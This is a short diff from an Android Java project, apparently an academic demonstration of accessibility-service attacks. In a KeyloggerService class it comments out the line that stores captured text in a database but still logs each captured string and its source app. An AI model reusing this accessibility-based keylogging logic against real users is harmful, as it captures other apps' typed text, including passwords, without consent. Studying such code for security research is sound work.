@@ -17,7 +17,7 @@ import static pl.edu.agh.sarna.db.scripts.CloakScriptsKt.insertCloakText;
 public class KeyloggerService extends AccessibilityService {
 
     private KeyloggerBuffer buffer = new KeyloggerBuffer((text, packageName) -> {
-        insertCloakText(getApplicationContext(), getLastCloakRunID(getApplicationContext()), text, packageName);
+//        insertCloakText(getApplicationContext(), getLastCloakRunID(getApplicationContext()), text, packageName);
         String displayText = String.format("Saved text \"%s\" from %s", text, packageName);
         Log.d(LOG_TAG, displayText);
         LocalBroadcastManager.getInstance(KeyloggerService.this)
